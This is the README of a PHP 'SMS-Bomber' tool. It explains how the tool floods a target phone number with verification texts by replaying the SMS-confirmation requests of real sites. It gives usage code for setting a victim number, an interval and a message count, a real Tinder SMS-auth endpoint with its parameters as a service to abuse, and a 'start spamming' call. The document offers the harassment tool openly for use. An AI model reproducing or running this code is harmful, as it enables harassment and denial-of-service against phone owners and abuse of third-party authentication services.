# SMS-Bomber

create your SMS-bomber with this program

* how a bobmer works

I thought about the process of creating an SMS bomber. Climbing the sites with registration using a phone number, 
I began to monitor where the site sends the request, everything was easier than it seemed. In most cases,
the site sends a request for code to its API (basically a PHP script that sends a confirmation code). That is, 
the bomber simply fakes and recreates this very request, as if the user requested something on the site? Yes. 

# usage:
```php
unclude "Bomber.php";

$number = "number";
$interval = 1000; //milliseconds(int)
$count = 20; //messages count(int)

$sms = new Bomber();
$sms->setNumber($number);
```

# add format:

each service requests a number in a different format. 
create the format you need 

```php
$sms->addFormat("myFormat", function($number) {
    return preg_replace("/^\+/", '', $number);
});
```

# add service:

you can add an infinite number of services

```php
$url = "https://api.gotinder.com/v2/auth/sms/send?";
$params = [
    "phone_number" => "%number%",
    "auth_type" => "sms",
    "locale" => "ru",
];
$format = "myFormat";
$sms->addService("Tinder", $url, $params, $format);
```

# how to check and make a request

To make a request without resorting to the code, you can use the free [PostMan](https://www.postman-beta.com/downloads/) utility. 
your open the program, your can register or skip registration and immediately start working. 

# start spamming
```php
$sms->start($interval, $count); 
```